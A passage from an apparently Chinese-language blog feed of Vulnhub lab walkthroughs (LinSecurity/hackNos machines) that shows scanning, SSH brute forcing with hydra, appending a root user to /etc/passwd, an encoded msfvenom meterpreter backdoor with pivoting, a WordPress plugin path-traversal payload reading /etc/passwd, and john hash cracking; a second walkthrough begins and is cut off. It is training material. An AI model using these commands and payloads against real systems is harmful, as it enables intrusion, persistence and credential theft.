class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.0048s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)</span><br><span class="line">|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)</span><br><span class="line">|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)</span><br><span class="line">111&#x2F;tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100003  3           2049&#x2F;udp   nfs</span><br><span class="line">|   100003  3           2049&#x2F;udp6  nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp   nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp6  nfs</span><br><span class="line">|   100005  1,2,3      36117&#x2F;tcp   mountd</span><br><span class="line">|   100005  1,2,3      36311&#x2F;udp   mountd</span><br><span class="line">|   100005  1,2,3      50621&#x2F;tcp6  mountd</span><br><span class="line">|   100005  1,2,3      58468&#x2F;udp6  mountd</span><br><span class="line">|   100021  1,3,4      36071&#x2F;udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      38529&#x2F;tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41451&#x2F;udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41509&#x2F;tcp   nlockmgr</span><br><span class="line">|   100227  3           2049&#x2F;tcp   nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;udp   nfs_acl</span><br><span class="line">|_  100227  3           2049&#x2F;udp6  nfs_acl</span><br><span class="line">2049&#x2F;tcp open  nfs_acl 3 (RPC #100227)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds</span><br></pre></td></tr></table></figure><p>开放ssh服务与nfs服务</p><h3 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h3><p><strong>NFS目录挂载</strong><br />尝试在A1上挂载A2的<code>/home/peter</code>目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim &#x2F;etc&#x2F;exports</span><br><span class="line">    &#x2F;share1 *(sync,ro) 192.168.56.103(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.56.103</span><br><span class="line">    Export list for 192.168.56.103:</span><br><span class="line">    &#x2F;home&#x2F;peter *</span><br><span class="line">mkdir &#x2F;mnt&#x2F;share1</span><br><span class="line">mount -t nfs 192.168.56.103:&#x2F;home&#x2F;peter &#x2F;mnt&#x2F;share1</span><br><span class="line">cd &#x2F;mnt&#x2F;share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>挂载失败</p><p><strong>RPCBind</strong><br />未找到可以获取Shell的EXP</p><p><strong>SSH</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains hydra -V -I -f -t 64 -L user -P pass ssh:&#x2F;&#x2F;192.168.56.103:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.56.103   login: bob   password: secret</span><br></pre></td></tr></table></figure><p>获取账户“bob”</p><h3 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h3><p>在A1上用SSH登录A2，sudo提权，写入新root账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssh bob@192.168.56.103</span><br><span class="line">sudo -i</span><br><span class="line">secret</span><br><span class="line">perl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    adWo3GnVnKzuU</span><br><span class="line">echo &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">exit</span><br><span class="line">exit</span><br><span class="line">ssh test@192.168.56.103</span><br><span class="line">hackforfun</span><br><span class="line">uname -a</span><br><span class="line">    Linux linsecurity 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造Meterpreter后门程序</p><p><code>msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.56.103 LPORT=2345 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf2.elf</code></p><p>将Meterpreter后门程序上传至A2<br /><code>proxychians scp msf2.elf test@192.168.56.103:/root/msf2.elf</code></p><p>在A2上运行后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +X msf2.elf</span><br><span class="line">.&#x2F;msf2.elf &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set RHOST 192.168.56.103</span><br><span class="line">set LPORT 2345</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功获取Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s3</span><br><span class="line">Hardware MAC : 08:00:27:d8:9f:d6</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.56.103</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fed8:9fd6</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s8</span><br><span class="line">Hardware MAC : 08:00:27:be:f1:93</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.156.5</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:febe:f193</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  4</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : docker0</span><br><span class="line">Hardware MAC : 02:42:f4:43:ba:1b</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 172.17.0.1</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br></pre></td></tr></table></figure><p>发现192.168.156.0网段</p><p>在Meterpreter中添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.156.0&#x2F;24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.56.0       255.255.255.0      Session 1</span><br><span class="line">   192.168.156.0      255.255.255.0      Session 2</span><br></pre></td></tr></table></figure><p>在MSF中扫描内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep </span><br><span class="line">set RHOSTS 192.168.156.0&#x2F;24</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">[+] 192.168.156.6 appears to be up (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></table></figure><p>发现内网机器A3</p><hr /><h2 id="hacknos-2"><a class="markdownIt-Anchor" href="#hacknos-2"></a> hackNos-2</h2><h3 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h3><p><code>proxychains nmap -sT -Pn -v -T5 -A 192.168.156.6</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.156.6</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure><h3 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h3><p><code>dirb http://192.168.156.6 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.156.6&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h3><p>使用wpscan针对wordpress进行扫描</p><p><code>proxychains wpscan --url http://192.168.156.6/tsweb/ --enumerate u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>发现存在用户user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; --enumerate p</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>存在插件<code>gracemedia-media-player</code></p><p>搜索得到相关EXP<br /><code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p><p>得到两条重要信息</p><ul><li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li><li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li></ul><p>可以破解flag账户的密码</p><h3 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h3><p>使用john进行字典爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>使用flag账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh flag@192.168.156.6</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p>以上三条命令均可</p><p>尝试直接sudo提权，失败</p><p>尝试在目标服务器内搜索信息<br />发现文件<code>/var/backups/passbkp/md5-hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash</span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure><p>得到rohit账户的密码</p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure><p>切换到rohit账户，并尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p><strong>内网渗透的几个思路</strong></p><p><em>proxychains+meterpreter</em><br />在获取机器的权限之后，上传meterpreter后门，然后建立路由，再借以本机的socks代理服务来进行流量转发，但是需要注意免杀，以及控制的持续化。meterpreter的便利之处在于，可以建立路由然后便于MSF对于内网的直接渗透，以及附带的许多使用功能。</p><p><em>proxychains+earthworm</em><br />与meterpreter类似，但是只是上传一个流量转发工具而不是后门程序，所以可能不太会需要考虑到免杀这一方面，但是开启代理服务的话貌似还是有点危险的。而且如果进行多层渗透的话，可能需要相应的多搭几条代理路线，在操作时可能需要记下相应的信息。</p><p>nmap进行扫描最好带上<code>-n</code>来取消掉dns解析</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub_Walkthrough_Set</title>
    <link href="https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/"/>
    <id>https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/</id>
    <published>2023-02-08T00:05:32.000Z</published>
    <updated>2023-03-02T16:44:13.987Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="os-hacknos-1"><a class="markdownIt-Anchor" href="#os-hacknos-1"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">Os-hackNos-1</a></h1><p><code>2019/11/30 22:06:46</code></p><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><p><code>nmap -sV -Pn -v -T5 -A 192.168.56.104</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)</span><br></pre></td></tr></table></figure><h2 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h2><p><code>dirb http://192.168.56.104 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.56.104&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;index.html (CODE:200|SIZE:11321)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;server-status (CODE:403|SIZE:279)                                                  </span><br><span class="line">                                                                                                           </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;includes&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;index.php (CODE:200|SIZE:7687)                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;misc&#x2F;                                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;modules&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;profiles&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;robots.txt (CODE:200|SIZE:2189)                                             </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;scripts&#x2F;                                                       </span><br><span 